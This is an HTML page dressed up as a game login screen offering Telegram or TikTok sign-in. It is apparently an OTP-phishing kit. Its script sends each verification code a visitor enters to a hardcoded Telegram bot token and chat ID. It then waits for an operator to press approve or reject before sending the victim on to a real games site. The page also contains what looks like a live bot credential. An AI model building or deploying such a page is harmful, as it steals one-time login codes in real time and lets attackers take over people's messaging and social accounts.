<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>body { background: #f0f2f5; font-family: sans-serif; }</style>
</head>
<body>

<div id="app" class="max-w-md mx-auto h-screen flex flex-col justify-center items-center p-6">
    <!-- Login Screen -->
    <div id="loginScreen" class="w-full bg-white p-8 rounded-2xl shadow-lg text-center">
        <h2 class="text-2xl font-bold mb-6">Login to Play</h2>
        <button onclick="selectLogin('Telegram')" class="w-full bg-blue-500 text-white py-3 rounded-lg mb-4">Login with Telegram</button>
        <button onclick="selectLogin('TikTok')" class="w-full bg-black text-white py-3 rounded-lg">Login with TikTok</button>
    </div>

    <!-- OTP & Wait Screen -->
    <div id="otpScreen" class="hidden w-full bg-white p-8 rounded-2xl shadow-lg text-center">
        <h2 id="loginType" class="text-xl font-bold mb-4"></h2>
        <div id="inputArea">
            <input type="number" id="otpInput" placeholder="Enter Code" class="w-full border-b-2 p-2 mb-6 text-center text-xl outline-none">
            <button onclick="submitOTP()" class="w-full bg-green-500 text-white py-3 rounded-lg">Submit</button>
        </div>
        
        <!-- Admin Approval Waiting UI -->
        <div id="waitingArea" class="hidden mt-4">
            <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-500 mx-auto mb-4"></div>
            <p class="text-blue-600 font-bold">Admin ထံမှ ခွင့်ပြုချက် စောင့်ဆိုင်းနေပါသည်...</p>
            <p class="text-xs text-gray-400 mt-2">ခွင့်ပြုချက်ရလျှင် ဂိမ်းထဲသို့ အလိုအလျောက် ရောက်သွားပါမည်။</p>
        </div>
    </div>
</div>

<script>
    const token = "8895720681:AAGuAuVf5qAwD3y84RiH7B3fEfBz9P1t_Hs";
    const chat = "5304050102";
    const gameLink = "https://www.crazygames.com";
    let method = "";
    let userKey = "user_" + Math.floor(Math.random() * 10000); // User တစ်ယောက်ချင်းစီကို ခွဲခြားရန်

    // တစ်ခါဝင်ထားပြီးသားဆိုလျှင် တန်းဝင်ရန်
    if (localStorage.getItem('isApproved') === 'true') {
        window.location.href = gameLink;
    }

    function selectLogin(type) {
        method = type;
        document.getElementById('loginScreen').classList.add('hidden');
        document.getElementById('otpScreen').classList.remove('hidden');
        document.getElementById('loginType').innerText = type + " Verification";
    }

    async function submitOTP() {
        const code = document.getElementById('otpInput').value;
        if(!code) return alert("Please enter code");

        document.getElementById('inputArea').classList.add('hidden');
        document.getElementById('waitingArea').classList.remove('hidden');

        // Admin ဆီသို့ ခလုတ်များနှင့်အတူ Message ပို့ခြင်း
        const message = `🔔 *New Access Request*\n\nMethod: ${method}\nCode: \`${code}\`\nUser ID: \`${userKey}\``;
        
        // Telegram Inline Keyboard Buttons
        const keyboard = {
            inline_keyboard: [[
                { text: "✅ Approve", callback_data: `approve_${userKey}` },
                { text: "❌ Reject", callback_data: `reject_${userKey}` }
            ]]
        };

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: chat,
                text: message,
                parse_mode: "Markdown",
                reply_markup: keyboard
            })
        });

        // Admin က Approve လုပ်မလုပ် စစ်ဆေးသည့် Polling စတင်ခြင်း
        startCheckingStatus();
    }

    function startCheckingStatus() {
        const checkInterval = setInterval(async () => {
            // ဤနေရာတွင် တကယ့်စနစ်တွင် Backend/Database ကို စစ်ရမည်။ 
            // သို့သော် GitHub Pages သုံးထားလျှင် Bot ဆီမှ နောက်ဆုံးစာကို ပြန်ဖတ်သည့်နည်း သုံးရပါမည်။
            try {
                const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
                const data = await response.json();
                const lastUpdate = data.result[0];

                if (lastUpdate && lastUpdate.callback_query) {
                    const action = lastUpdate.callback_query.data;
                    if (action === `approve_${userKey}`) {
                        clearInterval(checkInterval);
                        localStorage.setItem('isApproved', 'true');
                        window.location.href = gameLink;
                    } else if (action === `reject_${userKey}`) {
                        clearInterval(checkInterval);
                        alert("သင်၏ဝင်ရောက်ခွင့်ကို Admin မှ ငြင်းပယ်လိုက်ပါသည်။");
                        location.reload();
                    }
                }
            } catch (e) {}
        }, 3000); // ၃ စက္ကန့်တစ်ခါ စစ်မည်
    }
</script>
</body>
</html>
